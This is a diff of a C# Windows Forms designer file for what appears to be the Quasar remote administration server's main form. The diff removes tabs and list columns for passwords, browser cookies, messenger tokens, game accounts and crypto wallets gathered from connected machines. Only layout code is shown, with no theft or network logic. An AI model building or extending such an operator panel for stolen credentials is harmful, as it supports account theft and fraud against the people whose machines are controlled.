-            this.columnHeader6.Text = "User@PC";
-            this.columnHeader6.Width = 149;
-            // 
-            // dotNetBarTabControl1
-            // 
-            this.dotNetBarTabControl1.Controls.Add(this.Passwords);
-            this.dotNetBarTabControl1.Controls.Add(this.Cookies);
-            this.dotNetBarTabControl1.Controls.Add(this.Communication);
-            this.dotNetBarTabControl1.Controls.Add(this.Games);
-            this.dotNetBarTabControl1.Controls.Add(this.tabPage6);
-            this.dotNetBarTabControl1.Controls.Add(this.tabPage7);
-            this.dotNetBarTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
-            this.dotNetBarTabControl1.ItemSize = new System.Drawing.Size(80, 22);
-            this.dotNetBarTabControl1.Location = new System.Drawing.Point(156, 3);
-            this.dotNetBarTabControl1.Name = "dotNetBarTabControl1";
-            this.dotNetBarTabControl1.SelectedIndex = 0;
-            this.dotNetBarTabControl1.Size = new System.Drawing.Size(961, 459);
-            this.dotNetBarTabControl1.TabIndex = 1;
-            // 
-            // Passwords
-            // 
-            this.Passwords.Controls.Add(this.aeroListView2);
-            this.Passwords.Location = new System.Drawing.Point(4, 26);
-            this.Passwords.Name = "Passwords";
-            this.Passwords.Padding = new System.Windows.Forms.Padding(3);
-            this.Passwords.Size = new System.Drawing.Size(953, 429);
-            this.Passwords.TabIndex = 0;
-            this.Passwords.Text = "Passwords";
-            this.Passwords.UseVisualStyleBackColor = true;
-            // 
-            // Cookies
-            // 
-            this.Cookies.Controls.Add(this.aeroListView3);
-            this.Cookies.Location = new System.Drawing.Point(4, 26);
-            this.Cookies.Name = "Cookies";
-            this.Cookies.Padding = new System.Windows.Forms.Padding(3);
-            this.Cookies.Size = new System.Drawing.Size(953, 429);
-            this.Cookies.TabIndex = 1;
-            this.Cookies.Text = "Cookies";
-            this.Cookies.UseVisualStyleBackColor = true;
-            // 
-            // splitter2
-            // 
-            this.splitter2.Location = new System.Drawing.Point(156, 3);
-            this.splitter2.Name = "splitter2";
-            this.splitter2.Size = new System.Drawing.Size(3, 459);
-            this.splitter2.TabIndex = 2;
-            this.splitter2.TabStop = false;
-            // 
-            // aeroListView2
-            // 
-            this.aeroListView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            this.columnHeader9,
-            this.columnHeader10,
-            this.columnHeader12});
-            this.aeroListView2.Dock = System.Windows.Forms.DockStyle.Fill;
-            this.aeroListView2.FullRowSelect = true;
-            this.aeroListView2.HideSelection = false;
-            this.aeroListView2.Location = new System.Drawing.Point(3, 3);
-            listViewColumnSorter5.NeedNumberCompare = false;
-            listViewColumnSorter5.Order = System.Windows.Forms.SortOrder.None;
-            listViewColumnSorter5.SortColumn = 0;
-            this.aeroListView2.LvwColumnSorter = listViewColumnSorter5;
-            this.aeroListView2.Name = "aeroListView2";
-            this.aeroListView2.Size = new System.Drawing.Size(947, 423);
-            this.aeroListView2.TabIndex = 0;
-            this.aeroListView2.UseCompatibleStateImageBehavior = false;
-            this.aeroListView2.View = System.Windows.Forms.View.Details;
-            // 
-            // columnHeader9
-            // 
-            this.columnHeader9.Text = "Username";
-            this.columnHeader9.Width = 227;
-            // 
-            // columnHeader10
-            // 
-            this.columnHeader10.Text = "Password";
-            this.columnHeader10.Width = 266;
-            // 
-            // columnHeader12
-            // 
-            this.columnHeader12.Text = "Website";
-            this.columnHeader12.Width = 446;
-            // 
-            // aeroListView3
-            // 
-            this.aeroListView3.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            this.columnHeader14,
-            this.columnHeader16});
-            this.aeroListView3.Dock = System.Windows.Forms.DockStyle.Fill;
-            this.aeroListView3.FullRowSelect = true;
-            this.aeroListView3.HideSelection = false;
-            this.aeroListView3.Location = new System.Drawing.Point(3, 3);
-            listViewColumnSorter6.NeedNumberCompare = false;
-            listViewColumnSorter6.Order = System.Windows.Forms.SortOrder.None;
-            listViewColumnSorter6.SortColumn = 0;
-            this.aeroListView3.LvwColumnSorter = listViewColumnSorter6;
-            this.aeroListView3.Name = "aeroListView3";
-            this.aeroListView3.Size = new System.Drawing.Size(947, 423);
-            this.aeroListView3.TabIndex = 1;
-            this.aeroListView3.UseCompatibleStateImageBehavior = false;
-            this.aeroListView3.View = System.Windows.Forms.View.Details;
-            // 
-            // columnHeader14
-            // 
-            this.columnHeader14.Text = "Cookie";
-            this.columnHeader14.Width = 498;
-            // 
-            // columnHeader16
-            // 
-            this.columnHeader16.Text = "Website";
-            this.columnHeader16.Width = 443;
-            // 
-            // Communication
-            // 
-            this.Communication.Controls.Add(this.aeroListView4);
-            this.Communication.Location = new System.Drawing.Point(4, 26);
-            this.Communication.Name = "Communication";
-            this.Communication.Padding = new System.Windows.Forms.Padding(3);
-            this.Communication.Size = new System.Drawing.Size(953, 429);
-            this.Communication.TabIndex = 2;
-            this.Communication.Text = "Communication";
-            this.Communication.UseVisualStyleBackColor = true;
-            // 
-            // aeroListView4
-            // 
-            this.aeroListView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            this.columnHeader15,
-            this.columnHeader17});
-            this.aeroListView4.Dock = System.Windows.Forms.DockStyle.Fill;
-            this.aeroListView4.FullRowSelect = true;
-            this.aeroListView4.HideSelection = false;
-            this.aeroListView4.Location = new System.Drawing.Point(3, 3);
-            listViewColumnSorter7.NeedNumberCompare = false;
-            listViewColumnSorter7.Order = System.Windows.Forms.SortOrder.None;
-            listViewColumnSorter7.SortColumn = 0;
-            this.aeroListView4.LvwColumnSorter = listViewColumnSorter7;
-            this.aeroListView4.Name = "aeroListView4";
-            this.aeroListView4.Size = new System.Drawing.Size(947, 423);
-            this.aeroListView4.TabIndex = 2;
-            this.aeroListView4.UseCompatibleStateImageBehavior = false;
-            this.aeroListView4.View = System.Windows.Forms.View.Details;
-            // 
-            // columnHeader15
-            // 
-            this.columnHeader15.Text = "Communicator";
-            this.columnHeader15.Width = 140;
-            // 
-            // columnHeader17
-            // 
-            this.columnHeader17.Text = "Token";
-            this.columnHeader17.Width = 803;
-            // 
-            // Games
-            // 
-            this.Games.Controls.Add(this.aeroListView5);
-            this.Games.Location = new System.Drawing.Point(4, 26);
-            this.Games.Name = "Games";
-            this.Games.Padding = new System.Windows.Forms.Padding(3);
-            this.Games.Size = new System.Drawing.Size(953, 429);
-            this.Games.TabIndex = 3;
-            this.Games.Text = "Games";
-            this.Games.UseVisualStyleBackColor = true;
-            // 
-            // aeroListView5
-            // 
-            this.aeroListView5.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            this.columnHeader7});
-            this.aeroListView5.Dock = System.Windows.Forms.DockStyle.Fill;
-            this.aeroListView5.FullRowSelect = true;
-            this.aeroListView5.HideSelection = false;
-            this.aeroListView5.Location = new System.Drawing.Point(3, 3);
-            listViewColumnSorter8.NeedNumberCompare = false;
-            listViewColumnSorter8.Order = System.Windows.Forms.SortOrder.None;
-            listViewColumnSorter8.SortColumn = 0;
-            this.aeroListView5.LvwColumnSorter = listViewColumnSorter8;
-            this.aeroListView5.Name = "aeroListView5";
-            this.aeroListView5.Size = new System.Drawing.Size(947, 423);
-            this.aeroListView5.TabIndex = 0;
-            this.aeroListView5.UseCompatibleStateImageBehavior = false;
-            this.aeroListView5.View = System.Windows.Forms.View.Details;
-            // 
-            // columnHeader7
-            // 
-            this.columnHeader7.Text = "Game";
-            this.columnHeader7.Width = 926;
-            // 
-            // tabPage6
-            // 
-            this.tabPage6.Controls.Add(this.aeroListView6);
-            this.tabPage6.Location = new System.Drawing.Point(4, 26);
-            this.tabPage6.Name = "tabPage6";
-            this.tabPage6.Padding = new System.Windows.Forms.Padding(3);
-            this.tabPage6.Size = new System.Drawing.Size(953, 429);
-            this.tabPage6.TabIndex = 4;
-            this.tabPage6.Text = "Wallets";
-            this.tabPage6.UseVisualStyleBackColor = true;
-            // 
-            // aeroListView6
-            // 
-            this.aeroListView6.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
-            this.columnHeader13});
-            this.aeroListView6.Dock = System.Windows.Forms.DockStyle.Fill;
-            this.aeroListView6.FullRowSelect = true;
-            this.aeroListView6.HideSelection = false;
-            this.aeroListView6.Location = new System.Drawing.Point(3, 3);
-            listViewColumnSorter9.NeedNumberCompare = false;
-            listViewColumnSorter9.Order = System.Windows.Forms.SortOrder.None;
-            listViewColumnSorter9.SortColumn = 0;
-            this.aeroListView6.LvwColumnSorter = listViewColumnSorter9;
-            this.aeroListView6.Name = "aeroListView6";
-            this.aeroListView6.Size = new System.Drawing.Size(947, 423);
-            this.aeroListView6.TabIndex = 1;
-            this.aeroListView6.UseCompatibleStateImageBehavior = false;
-            this.aeroListView6.View = System.Windows.Forms.View.Details;
-            // 
-            // columnHeader13
-            // 
-            this.columnHeader13.Text = "Wallet";
-            this.columnHeader13.Width = 943;
-            // 
-            // tabPage7
-            // 
-            this.tabPage7.Location = new System.Drawing.Point(4, 26);
-            this.tabPage7.Name = "tabPage7";
-            this.tabPage7.Padding = new System.Windows.Forms.Padding(3);
-            this.tabPage7.Size = new System.Drawing.Size(953, 429);
-            this.tabPage7.TabIndex = 5;
-            this.tabPage7.Text = "Other";
-            this.tabPage7.UseVisualStyleBackColor = true;
-            // 
             // FrmMain
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
-            this.ClientSize = new System.Drawing.Size(1128, 538);
+            this.ClientSize = new System.Drawing.Size(1024, 538);
             this.Controls.Add(this.tableLayoutPanel);
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.ForeColor = System.Drawing.Color.Black;
@@ -2202,16 +2196,16 @@ namespace Quasar.Server.Forms
             this.tabPage4.ResumeLayout(false);
             this.TasksContextMenuStrip.ResumeLayout(false);
             this.tabPage5.ResumeLayout(false);
-            this.statusStrip.ResumeLayout(false);
-            this.statusStrip.PerformLayout();
-            this.menuStrip.ResumeLayout(false);
-            this.menuStrip.PerformLayout();
             this.dotNetBarTabControl1.ResumeLayout(false);
             this.Passwords.ResumeLayout(false);
             this.Cookies.ResumeLayout(false);
             this.Communication.ResumeLayout(false);
             this.Games.ResumeLayout(false);
             this.tabPage6.ResumeLayout(false);
+            this.statusStrip.ResumeLayout(false);
+            this.statusStrip.PerformLayout();
+            this.menuStrip.ResumeLayout(false);
+            this.menuStrip.PerformLayout();
             this.ResumeLayout(false);
 
         }
@@ -2349,7 +2343,6 @@ namespace Quasar.Server.Forms
         private ColumnHeader hCountry;
         private ColumnHeader hOS;
         private ColumnHeader hAccountType;
-        private ColumnHeader hWallets;
         private TableLayoutPanel tableLayoutPanel1;
         private Label label1;
         private PictureBox pictureBoxMain;
